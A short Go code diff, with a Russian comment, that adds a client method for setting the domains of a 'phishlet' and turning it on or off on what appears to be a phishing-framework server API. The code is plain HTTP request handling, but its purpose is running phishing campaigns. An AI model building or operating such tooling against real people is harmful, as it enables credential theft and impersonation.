@@ -160,3 +160,23 @@ func (c *Client) Generate(origin, domain, id string) (string, error) {
 	}
 	return string(out), nil
 }
+
+// SetPhishlet — домены и/или вкл/выкл фишлета (nil = не менять).
+// PUT /api/v1/phishlets/{id} -> 204, изменения персистятся на сервере.
+func (c *Client) SetPhishlet(id string, domains []string, enabled *bool) error {
+	b, _ := json.Marshal(map[string]any{"domains": domains, "enabled": enabled})
+	r, err := c.req(http.MethodPut, "/api/v1/phishlets/"+id, strings.NewReader(string(b)))
+	if err != nil {
+		return err
+	}
+	resp, err := c.http().Do(r)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusNoContent {
+		out, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
+		return fmt.Errorf("phishlet %d: %s", resp.StatusCode, string(out))
+	}
+	return nil
+}
